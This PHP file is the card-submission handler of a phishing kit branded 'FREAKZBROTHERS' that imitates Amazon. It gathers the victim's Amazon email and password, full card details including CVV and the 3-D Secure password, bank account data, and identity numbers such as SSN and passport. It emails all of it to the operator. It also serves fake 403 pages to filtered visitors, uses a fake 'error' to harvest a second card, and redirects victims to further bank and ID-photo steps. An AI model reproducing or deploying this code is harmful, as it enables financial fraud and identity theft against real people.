<?php
session_start();
error_reporting(0);
require_once("../main.php");
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once("../session.php");
$ip = getUserIP();
$randomnumber = rand(0, 100);
function validate_card($number) {
	global $type;

	$card_type = array(
		"visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
		"mastercard" => "/^5[1-5][0-9]{14}$/",
		"amex" => "/^3[47][0-9]{13}$/",
		"discover" => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
	);

	if (preg_match($card_type['visa'], $number)) {
		$type = "visa";
		return "visa";
	} else if (preg_match($card_type['mastercard'], $number)) {
		$type = "mastercard";
		return "mastercard";
	} else if (preg_match($card_type['amex'], $number)) {
		$type = "amex";
		return "amex";
	} else if (preg_match($card_type['discover'], $number)) {
		$type = "discover";
		return "discover";
	} else {
		return false;
	}
}

if ($_POST['ccno'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
$valid = validate_card($_POST['ccno']);
if ($valid == false) {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['exp_tahun'] < 19) {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['exp_bulan'] > 12) {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
$antidouble = md5($_POST['ccno']);
$_SESSION['ending'] = substr($_POST['ccno'], -4);
$bin = check_bin($_POST['ccno']);
$phone = check_carrier($_SESSION['phone']);
$ispuser = getisp($ip);
$message = "++++++++++++++++++++++++++++[ FREAKZBROTHERS ]+++++++++++++++++++++++++++\n";
$message .= "++-------------------------[ AMAZON ACCOUNT ]------------------------++\n";
$message .= "# Email 			:	".$_SESSION['email']."\n";
$message .= "# Password 		:	".$_SESSION['password']."\n";
$message .= "++--------------------------[ CREDIT CARD ]--------------------------++\n";
$message .= "# Bank 			:	".$bin["bank"]["name"]."\n";
$message .= "# Type 			:	".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "# Level 			:	".strtoupper($bin["brand"])."\n";
$message .= "# Card Holder 		:	".$_POST['ccname']."\n";
$message .= "# Card Number 	:	".$_POST['ccno']."\n";
$message .= "# Expire Date 		:	".$_POST['exp_bulan']."/".$_POST['exp_tahun']."\n";
$message .= "# Cvv 			:	".$_POST['cvv']."\n";
$message .= "# Amex CID 		:	".$_POST['cid']."\n";
$message .= "# Account Number 	:	".$_POST['acno']."\n";
$message .= "# Sort Code 		:	".$_POST['sortcode']."\n";
$message .= "# Credit Limit 		:	".$_POST['climit']."\n";
$message .= "# For Check 		:	".$_POST['ccno']."|".$_POST['exp_bulan']."|".$_POST['exp_tahun']."|".$_POST['cvv']."\n";
$message .= "++-----------------------------[ VBV JP ]---------------------------++\n";
$message .= "# Card Password 	:	".$_POST['passjp']."\n";
$message .= "# Web ID 			:	".$_POST['cardid']."\n";
if ($config['get_billing'] == "on") {
$message .= "++-----------------------------[ BILLING ]--------------------------++\n";
$message .= "# Full Name 		:	".$_SESSION['fullname']."\n";
$message .= "# Address 		:	".$_SESSION['address']."\n";
$message .= "# City 			:	".$_SESSION['city']."\n";
$message .= "# State 			:	".$_SESSION['state']."\n";
$message .= "# Zip 			:	".$_SESSION['zipcode']."\n";
$message .= "# Country 		:	".$_SESSION['country']."\n";
$message .= "# DOB 			:	".$_SESSION['dob']."\n";
$message .= "# Phone Number 	:	".$_SESSION['phone']."\n";
$message .= "# Phone Carrier 	:	".$phone['carrier']."\n";
$message .= "++----------------------------[ OTHER INFO ]-----------------------++\n";
$message .= "# ID Number 				:	".$_SESSION['numbid']."\n";
$message .= "# Civil ID 					:	".$_SESSION['civilid']."\n";
$message .= "# Qatar ID 				:	".$_SESSION['qatarid']."\n";
$message .= "# National ID 				:	".$_SESSION['naid']."\n";
$message .= "# Citizen ID 				:	".$_SESSION['naid']."\n";
$message .= "# Passport Number 			:	".$_SESSION['passport']."\n";
$message .= "# Bank Access Number 		:	".$_SESSION['bans']."\n";
$message .= "# Social Insurance Number 	:	".$_SESSION['sin']."\n";
$message .= "# Social Security Number 	:	".$_SESSION['ssn']."\n";
$message .= "# OSID Number 			:	".$_SESSION['osidnumber']."\n";
}
$message .= "++----------------------------[ DEVICE INFO ]----------------------++\n";
$message .= "# IP Address 		:	".$ip."\n";
$message .= "# ISP 			:	".$ispuser."\n";
$message .= "# Region 			:	".$regioncity."\n";
$message .= "# City 			:	".$citykota."\n";
$message .= "# Continent 		:	".$continent."\n";
$message .= "# Time Zone 		:	".$timezone."\n";
$message .= "# OS/Browser 		:	".$os." / ".$br."\n";
$message .= "# Date 			:	".$date."\n";
$message .= "# User Agent 		:	".$user_agent."\n";
$message .= "++++++++++++++++++++++++++++[ FREAKZBROTHERS ]+++++++++++++++++++++++++++\n";

$_SESSION['emailBill'] = $_SESSION['email'];
$_SESSION['bank_name'] = $bin["bank"]["name"];
$bins = preg_replace('/\s/', '', $_POST['ccno']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_POST['ccname'];
$to = $config['email_result'];
$headers = "From: ".$_POST['ccname']." <freakzbrothers-v2.0-$randomnumber@freakz.site>";
if($config['get_billing'] == "on") {
	$from = $_SESSION['fullname'];
} else {
	$from = $_POST['ccname'];
}
if($bin["brand"] == "") {
		$subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." // $os - $ip - $cn";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
	$subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." // $os - $ip - $cn";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
if ($antidouble == $_SESSION['anti_double']) {
} else {
	mail($to, $subject, $message, $headers);
	tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin\n");
}
$_SESSION['anti_double'] = md5($_POST['ccno']);
if ($_SESSION['cc_pertama'] == "udah") {
} else {
	if($config['double_cc'] == "Yes") {
		$_SESSION['cc_pertama'] = "udah";
			echo "<script type='text/javascript'>window.top.location='../ap/payment?session=$key&error=1';</script>";
	}
}
if ($config['get_bank'] == "Yups") {
	echo "<script type='text/javascript'>window.top.location='../ap/bank?session=$key';</script>";
	exit();
} else {
	if ($config['get_photo'] == "Oks") {
		echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
		exit();
	}else{
		echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
		exit();
	}
}
?>